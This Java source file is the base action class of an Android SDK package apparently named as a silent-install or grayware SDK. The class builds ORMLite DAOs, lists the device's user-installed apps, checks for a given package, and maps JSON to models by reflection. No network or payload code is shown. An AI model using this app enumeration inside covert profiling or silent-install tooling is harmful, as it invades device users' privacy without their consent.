package sdk.grayweb.com.slientsdk.action;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;

import com.j256.ormlite.android.AndroidConnectionSource;
import com.j256.ormlite.dao.Dao;
import com.j256.ormlite.support.ConnectionSource;

import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONObject;

import java.lang.reflect.Field;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

import sdk.grayweb.com.slientsdk.SQLiteHelperOrm;
import sdk.grayweb.com.slientsdk.http.HttpClient;
import sdk.grayweb.com.slientsdk.model.ActionModel;
import sdk.grayweb.com.slientsdk.model.ApkModel;
import sdk.grayweb.com.slientsdk.model.InstallApk;
import sdk.grayweb.com.slientsdk.model.OpenPackage;

/**
 * Created by engine on 16/5/11.
 */
public abstract class AbstractAction implements IAction {
    protected Context mContext;
    protected Dao<OpenPackage, String> openPackageDao;
    protected Dao<ApkModel, String> apkModelDao;
    protected Dao<ActionModel, String> actionDao;
    protected String TAG = getClass().getSimpleName() ;

    public AbstractAction(Context context) {
        this.mContext = context;
        ConnectionSource connectionSource =
                new AndroidConnectionSource(SQLiteHelperOrm.getInstance(context));
        try {
            openPackageDao = SQLiteHelperOrm.getInstance(context).getDao(OpenPackage.class);
            apkModelDao = SQLiteHelperOrm.getInstance(context).getDao(ApkModel.class);
            actionDao= SQLiteHelperOrm.getInstance(context).getDao(ActionModel.class);
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }

    protected List<InstallApk> installedApks() {
        List<InstallApk> list = new ArrayList<InstallApk>();
        List<PackageInfo> packages = mContext.getPackageManager().getInstalledPackages(0);
        for (PackageInfo p : packages) {
            if((p.applicationInfo.flags& ApplicationInfo.FLAG_SYSTEM)==0) {
                InstallApk apk = new InstallApk();
                apk.name = p.applicationInfo.loadLabel(
                        mContext.getPackageManager()).toString();
                apk.packageName = p.packageName;
                list.add(apk);
            }
        }
        return list;
    }
    protected boolean hasInstall(String packagename){
        List<InstallApk> installApks = installedApks();
        for (InstallApk apk:installApks){
            if (apk.packageName.equals(packagename)){
                return true ;
            }
        }
        return false;
    }
    protected  <T> T  jsonToModel(JSONObject jsonObject,Class<T> tClass){
        Field[] field = tClass.getDeclaredFields();
        try {
            T t = tClass.newInstance();
            for (Field f : field) {
                f.setAccessible(true);
                if (f.getType()== String.class){
                    f.set(t,jsonObject.opt(f.getName()));
                }else if(f.getType()==int.class){
                    f.setInt(t,jsonObject.optInt(f.getName()));
                }
            }
            return t;
        } catch (IllegalArgumentException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        }
        return null ;
    }
    protected <T> List<T> jsonArrayToList(JSONArray array,Class<T> tClass){
       List<T> list = new ArrayList<T>();
        for (int i=0 ;i<array.length();i++){
            list.add(jsonToModel(array.optJSONObject(i),tClass));
        }
        return list ;
    }
}
